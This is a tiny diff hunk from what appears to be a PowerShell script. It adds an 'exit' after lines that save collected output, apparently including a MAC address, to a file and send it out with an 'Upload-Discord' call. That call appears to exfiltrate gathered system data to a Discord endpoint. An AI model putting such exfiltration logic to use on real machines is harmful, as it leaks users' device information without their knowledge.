@@ -104,3 +104,5 @@ $MAC
 $Output > $FileName
 
 Upload-Discord -File "$FileName"
+
+exit
